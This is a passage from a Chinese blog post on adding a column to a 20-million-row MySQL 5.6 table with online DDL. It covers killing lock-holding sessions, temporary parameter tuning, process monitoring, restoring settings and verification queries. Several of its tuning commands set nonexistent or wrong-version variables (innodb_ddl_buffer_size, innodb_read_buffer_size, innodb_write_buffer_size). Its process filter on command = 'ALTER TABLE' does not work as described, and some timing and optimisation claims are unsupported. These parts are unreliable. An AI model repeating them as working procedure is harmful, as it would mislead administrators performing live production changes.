style=\"color: rgba(255, 0, 0, 1);\">'</span>, id, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">;</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">) \n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> INFORMATION_SCHEMA.PROCESSLIST \n</span><span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> db <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">数据库名</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> \n  <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> info <span style=\"color: rgba(128, 128, 128, 1);\">LIKE</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">%表名%</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> \n  <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> Time <span style=\"color: rgba(128, 128, 128, 1);\">&gt;</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">30</span> \n  <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> Command <span style=\"color: rgba(128, 128, 128, 1);\">IN</span> (<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">Query</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">Sleep</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 执行上述查询生成的KILL语句，释放S锁</span></span></pre>\n</div>\n</div>\n<h4><span>4.1.3 临时 MySQL 参数调优（提速 + 减少资源竞争）</span></h4>\n<div><span>可选：动态调整参数，无需重启，DDL 完成后恢复，核心优化 DDL 执行效率和 IO 利用率：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 调大DDL专用缓冲区，提升批量拷贝效率（默认1M，调至16M）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_ddl_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">16</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 减少写操作IO开销，避免新的长事务</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">2</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 调大读写缓冲区，缓解缓存竞争</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_read_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">16</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_write_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">8</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span>;</span></pre>\n</div>\n</div>\n<h3><span>4.2 执行中：实时监控 + 状态判断 + 资源管控</span></h3>\n<h4><span>4.2.1 核心状态判断（确认 MDL 锁获取成功）</span></h4>\n<div><span>通过<code>SHOW FULL PROCESSLIST;</code>查看 DDL 进程状态，脱离锁表风险期的核心标志：</span></div>\n<ul>\n<li><span>风险状态：<code>State = Waiting for table metadata lock</code>（未获取 MDL 锁，阻塞后续所有读写）；</span></li>\n<li><span>正常状态：<code>State = executing</code> 或 <code>State = copying to tmp table</code>（MDL 锁已成功获取，DDL 无锁执行中，二者为 MySQL 5.6 命名差异，等效无锁）。</span></li>\n</ul>\n<div><span>精准过滤 DDL 进程的查询语句（避免翻找）：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span><span style=\"color: rgba(0, 0, 0, 1);\"> id, command, state, info, time \n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> INFORMATION_SCHEMA.PROCESSLIST \n</span><span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> info <span style=\"color: rgba(128, 128, 128, 1);\">LIKE</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">%表名%</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> \n  <span style=\"color: rgba(128, 128, 128, 1);\">AND</span> command <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">ALTER TABLE</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>;</span></pre>\n</div>\n</div>\n<h4><span>4.2.2 实时资源监控</span></h4>\n<div><span>无需持续盯守，1 分钟查看 1 次核心指标，避免资源耗尽：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 0, 1);\">#</span><span style=\"color: rgba(0, 128, 0, 1);\"> 监控磁盘IO（核心，%util为关键指标，控制在≤80%）</span>\niostat -x 1\n<span style=\"color: rgba(0, 128, 0, 1);\">#</span><span style=\"color: rgba(0, 128, 0, 1);\"> 监控MySQL的CPU/内存占用</span>\ntop -p `pidof mysqld`</span></pre>\n</div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 查看InnoDB DDL执行状态，确认增量日志同步正常</span>\nSHOW ENGINE INNODB STATUS\\G;</span></pre>\n</div>\n</div>\n<h4><span>4.2.3 读写量突增的应对方案</span></h4>\n<div><span>可选：若执行期间业务读写量增加（IO 利用率 &gt; 90%），无需中断 DDL（中断会导致之前的工作白费），通过轻量操作缓解资源竞争：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 临时关闭自适应刷新，减少后台IO</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_adaptive_flushing <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(0, 0, 255, 1);\">OFF</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 若业务支持，临时动态限流（Java业务侧开关），将QPS限制在日常60%-70%</span></span></pre>\n</div>\n</div>\n<h3><span>4.3 执行后：恢复配置 + 全维度验证（必做）</span></h3>\n<h4><span>4.3.1 恢复 MySQL 默认配置</span></h4>\n<div><span>将临时调整的参数恢复默认，保证数据库长期运行的性能和数据安全性：</span></div>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 恢复DDL缓冲区</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_ddl_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 恢复日志刷盘安全级别（保证宕机不丢数据，核心）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 恢复读写缓冲区</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_read_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_write_buffer_size <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">8</span><span style=\"color: rgba(128, 128, 128, 1);\">*</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1024</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 恢复自适应刷新</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SET</span> GLOBAL innodb_adaptive_flushing <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(0, 0, 255, 1);\">ON</span>;</span></pre>\n</div>\n</div>\n<h4><span>4.3.2 DDL 执行成功的全维度验证</span></h4>\n<p><span>表结构验证：确认新字段属性完全符合预期</span></p>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">DESC</span> 表名; <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 快速查看字段属性</span>\nSHOW <span style=\"color: rgba(0, 0, 255, 1);\">CREATE</span> <span style=\"color: rgba(0, 0, 255, 1);\">TABLE</span> 表名; <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 精准确认完整定义</span></span></pre>\n</div>\n</div>\n<p><span>数据验证：确认新字段默认值赋值正常，无空值</span></p>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> id, 新增字段名 <span style=\"color: rgba(0, 0, 255, 1);\">FROM</span> 表名LIMIT <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">20</span>; <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 随机查询默认值</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(255, 0, 255, 1);\">COUNT</span>(<span style=\"color: rgba(128, 128, 128, 1);\">*</span>) <span style=\"color: rgba(0, 0, 255, 1);\">FROM</span> 表名 <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> 新增字段名 <span style=\"color: rgba(0, 0, 255, 1);\">IS</span> <span style=\"color: rgba(128, 128, 128, 1);\">NOT</span> <span style=\"color: rgba(0, 0, 255, 1);\">NULL</span>; <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 全量验证非空</span></span></pre>\n</div>\n</div>\n<p><span>读写验证：模拟业务操作，确认读写正常</span></p>\n<div>\n<div class=\"cnblogs_code\">\n<pre><span><span style=\"color: rgba(0, 0, 255, 1);\">UPDATE</span> 表名 <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> 新增字段名<span style=\"color: rgba(128, 128, 128, 1);\">=</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> id<span style=\"color: rgba(128, 128, 128, 1);\">=</span>xxx; <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 模拟更新</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">INSERT</span> <span style=\"color: rgba(0, 0, 255, 1);\">INTO</span> 表名 (id, 新增字段名) <span style=\"color: rgba(0, 0, 255, 1);\">VALUES</span> (xxx, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">3</span>); <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 模拟插入</span></span></pre>\n</div>\n</div>\n<p><span>业务验证：观察 Java 多线程业务日志，确认无超时、报错、事务回滚等异常。</span></p>\n<h2><span>五、关键问题与解决方案汇总</span></h2>\n<div><span>&nbsp;</span></div>\n<div>\n<div>\n<table>\n<thead>\n<tr><th><span>核心问题</span></th><th><span>解决方案</span></th><th><span>关键要点</span></th></tr>\n</thead>\n<tbody>\n<tr>\n<td><span>DDL 执行慢（全表拷贝）</span></td>\n<td><span>显式指定简单默认值，触发 MySQL 5.6 批量赋值优化</span></td>\n<td><span>数值类型优化效果优于 VARCHAR，BIGINT (19) DEFAULT 0 最优</span></td>\n</tr>\n<tr>\n<td><span>线性推算耗时偏差大</span></td>\n<td><span>无需推算，2000 万行表 SSD 磁盘 5-8 分钟，机械硬盘 12-18 分钟</span></td>\n<td><span>大表批量拷贝、缓存命中率高、连续 IO 优势降低单位行耗时</span></td>\n</tr>\n<tr>\n<td><span>MDL 锁等待导致锁表</span></td>\n<td><span>低峰期执行 + 清理锁源（踢长连接、终止长事务）</span></td>\n<td><span>执行前必做，避免 DDL 进入 Waiting for table metadata lock 状态</span></td>\n</tr>\n<tr>\n<td><span>高频读写场景资源竞争</span></td>\n<td><span>临时参数调优 + 轻量限流（可选）</span></td>\n<td><span>仅引发 IO/CPU 竞争，无锁表风险，业务延迟轻微波动</span></td>\n</tr>\n<tr>\n<td><span>执行期间读写量突增</span></td>\n<td><span>监控资源指标 + 临时降低 IO 刷盘频率</span></td>\n<td><span>无需中断 DDL，MySQL 会自动适配资源，优先保障业务</span></td>\n</tr>\n<tr>\n<td><span>DDL 状态判断困难</span></td>\n<td><span>通过 SHOW FULL PROCESSLIST 查看 State 列</span></td>\n<td><span>executing/copying to tmp table 为正常无锁状态</span></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n<div><span>&nbsp;</span></div>\n<h2><span>六、避坑指南：绝对禁止的操作</span></h2>\n<ol>\n<li><span>禁止在业务高峰期 / 中峰期执行 DDL：即使做了调优，高峰期 IO 已接近瓶颈，会导致业务延迟大幅增加，触发超时重试；</span></li>\n<li><span>禁止新增 “非空无默认值” 字段：MySQL 5.6 会全表逐行初始化，2000 万行表耗时数小时，且占用大量资源；</span></li>\n<li><span>禁止 DDL 等待 MDL 锁时无动于衷：MySQL 5.6 MDL 锁无超时，需手动终止持锁进程，否则会无限阻塞后续所有操作；</span></li>\n<li><span>禁止修改 MySQL 参数后不恢复：尤其是<code>innodb_flush_log_at_trx_commit=2</code>，会降低数据持久性，宕机可能丢失数据；</span></li>\n<li><span>禁止在 DDL 执行中手动中断进程：中断会导致之前的拷贝工作白费，重新执行需再次获取 MDL 锁，耗时翻倍；</span></li>\n<li><span>禁止忽略表结构验证：DDL 进程消失后，必须通过 DESC/SHOW CREATE TABLE 确认字段属性，避免定义缺失。</span></li>\n</ol>\n<h2><span>七、延伸优化：长期解决方案</span></h2>\n<div><span>本次实操为 MySQL 5.6 环境的临时最优解，若业务侧允许，升级至 MySQL 5.7/8.0是处理大表 DDL 的终极方案：</span></div>\n<ol>\n<li><span>高版本支持表结构元数据原地修改：新增数值类型 / VARCHAR 类型（允许空 / 简单默认值）字段时，仅修改元数据，无需全表拷贝，2000 万行表耗时毫秒级；</span></li>\n<li><span>MDL 锁机制优化：支持锁超时、排队机制优化，减少锁表概率；</span></li>\n<li><span>整体性能提升：查询优化、并发控制、锁机制均优于 5.6，高频读写表的整体性能提升 30%-50%；</span></li>\n<li><span>生态更完善：支持 JSON 类型、窗口函数、并行复制等新特性，满足业务后续发展需求。</span></li>\n</ol>\n<div><span>升级注意事项：升级前全量备份数据库，选择低峰期执行，主从切换可实现业务无感知升级，5.7/8.0 与 5.6 兼容性极高，普通业务代码无需修改。</span></div>\n<h2><span>八、总结</span></h2>\n<div><span>本次 MySQL 5.6 2000 万行高频读写表新增字段的实操，核心围绕 **“利用版本特性做优化、规避 MDL 锁机制坑、平衡资源竞争与业务稳定性”展开，最终实现了无锁、无业务感知、高效 ** 的落地，核心结论如下：</span></div>\n<ol>\n<li><span>MySQL 5.6 虽无高版本的元数据原地修改优化，但通过显式指定简单默认值，可大幅降低 DDL 执行时间，是 2000 万行表的最优临时方案；</span></li>\n<li><span>锁表的核心根源并非 DDL 本身，而是MDL 锁等待 + 长事务阻塞，执行前清理锁源是避坑关键；</span></li>\n<li><span>Online DDL 的无锁特性仅存在于MDL 锁获取成功后（executing/copying to tmp table 状态），此阶段脱离锁表风险，后续仅存在资源竞争；</span></li>\n<li><span>高频读写场景下执行 DDL，无需暂停业务，仅需低峰期执行 + 临时参数调优，业务延迟仅为毫秒级→十毫秒级，完全无感知；</span></li>\n<li><span>所有操作均为 MySQL 内置命令 + 动态参数调整，无需安装额外工具，适配生产环境紧急排查和日常实操。</span></li>\n</ol>\n<div><span>本次实操的方案可复用于 MySQL 5.6 环境下所有大表（千万级）的普通字段新增操作，为同版本、同场景的数据库运维提供可落地的参考。</span></div>\n</div>\n\n</div>\n<div id=\"MySignature\">\n    <div style=\"border: 2px solid yellow;\">\n<p style=\"font-weight: bold;\">  时间仓促，如有错误欢迎指出，欢迎在评论区讨论，如对您有帮助还请点个推荐、关注支持一下</p>\n<p style=\"font-weight: bold;\">  作者：<a href=\"http://www.cnblogs.com/xxhxs-21/\" target=\"_blank\">博客园 - 凉年技术</a></p>\n<p style=\"font-weight: bold;\">  出处：<a href=\"http://www.cnblogs.com/xxhxs-21/\" target=\"_blank\">http://www.cnblogs.com/xxhxs-21/</a></p>\n<p>  本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须在文章页面给出原文链接，否则保留追究法律责任的权利。</p>\n<p>  若内容有侵犯您权益的地方，请公告栏处联系本人，本人定积极配合处理解决。</p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 15:13</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xxhxs-21\">凉年技术</a>&nbsp;\n阅读(<span id=\"post_view_count\">41</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}